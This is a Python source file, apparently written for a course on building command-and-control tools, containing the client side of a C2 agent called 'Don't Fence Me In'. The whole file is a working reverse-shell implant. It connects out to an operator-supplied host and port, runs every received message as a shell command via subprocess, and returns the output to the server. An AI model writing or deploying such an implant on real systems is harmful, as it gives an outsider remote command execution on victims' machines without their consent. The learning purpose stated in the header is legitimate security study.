###########################################################################################
# Author:      Seth J. Gibson
# Course:      Learn by Doing - Python3 Command and Control How To Guide, by Joe Helle
# Program:     Don't Fence Me In
# Description: This program is the client for a C2 I am writing in my free time, following
#                   the guidance of Joe Helle's C2 course. This is primarily a learning
#                   experience for building large-scale projects, along with developing an 
#                   understanding of C2 malware and a further understanding of Python 
#                   Socket applications.
# Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
# Changelog:    Moved some exception handling into __main__
#               Revised exception handling
###########################################################################################

import socket
import subprocess
import os
import sys

buffer_size = 1024

def banner():
    print('\n██████╗  ██████╗ ███╗   ██╗████████╗    ███████╗███████╗███╗   ██╗ ██████╗███████╗    ███╗   ███╗███████╗    ██╗███╗   ██╗')
    print('██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝    ██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝    ████╗ ████║██╔════╝    ██║████╗  ██║')
    print('██║  ██║██║   ██║██╔██╗ ██║   ██║       █████╗  █████╗  ██╔██╗ ██║██║     █████╗      ██╔████╔██║█████╗      ██║██╔██╗ ██║')
    print('██║  ██║██║   ██║██║╚██╗██║   ██║       ██╔══╝  ██╔══╝  ██║╚██╗██║██║     ██╔══╝      ██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║')
    print('██████╔╝╚██████╔╝██║ ╚████║   ██║       ██║     ███████╗██║ ╚████║╚██████╗███████╗    ██║ ╚═╝ ██║███████╗    ██║██║ ╚████║')
    print('╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝')
    print('                                                                                                    by Seth Gibson        ')

def comm_in():
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(buffer_size).decode()
            return message
        except Exception:
            sock.close()

def comm_out(message):
    response = str(message).encode()
    sock.send(response)

def handler():
    print(f'[+] Connecting to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')

    while True:
        message = comm_in()
        print('[+] Message from server: ' + message)

        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break

        elif message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                current_dir = os.getcwd()
                print(f'[+] Changed to {current_dir}')
                comm_out(current_dir)
            except FileNotFoundError:
                comm_out('Invalid directory. Please try again.')
                continue

        else:
            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            comm_out(output.decode())

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        #banner()
        handler()
    except IndexError:
        print('[-] Command line arguments are missing. Please try again.')
    except Exception as e:
        print(e)
